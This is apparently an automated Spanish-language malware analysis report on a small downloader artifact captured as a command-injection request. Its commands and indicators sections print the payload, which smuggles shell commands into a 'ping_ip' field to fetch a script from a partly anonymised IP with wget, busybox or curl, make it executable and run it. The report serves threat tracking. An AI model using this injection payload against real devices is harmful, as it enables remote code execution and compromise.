# 🧬 Payload Analysis

`d3576a4b4e8375cb543ef52e5dca43b0042ca5c27110d5e185ea72df3a402f0a`

## 📌 Resumen

Artefacto identificado como ASCII text, with no line terminators de 274 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `wget.sh` en `hxxp://91.92.40.XXX/wget.sh`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:51:31.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `d3576a4b4e8375cb543ef52e5dca43b0042ca5c27110d5e185ea72df3a402f0a`
- **SHA1:** `cc180d188920e7af4e02e364fc65fa33ecd1a148`
- **MD5:** `714b65788e7a7963c67b90e9debf288a`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with no line terminators |
| Tamaño | 274 B |
| Entropía | 4.76 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with no line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
todo=ping_test&ping_ip=[internal-ip-redacted];cd%20/tmp%3Brm%20-f%20.s%3Bwget%20http://91.92.40.XXX/wget.sh%20-O%20.s%3Bbusybox%20wge
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://91.92.40.XXX/wget.sh%20-O%20.s%3Bbusybox%20wget%20http://91.92.40.XXX/wget.sh%20-O%20.s%3Bcurl%20-o%20.s%20http://91.92.40.XXX/wget.sh%3Bchmod%20777%20.s%3Bsh%20.s%20rep.ng2%3Brm%20-f%20.s&ping_size=4 | strings |
| ip | 91.92.40.XXX | static_analysis |
| command | todo=ping_test&ping_ip=[internal-ip-redacted];cd%20/tmp%3Brm%20-f%20.s%3Bwget%20http://91.92.40.XXX/wget.sh%20-O%20.s%3Bbusybox%20wge | strings |
| hash | d3576a4b4e8375cb543ef52e5dca43b0042ca5c27110d5e185ea72df3a402f0a | static_analysis |
| ip | 45.153.34.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
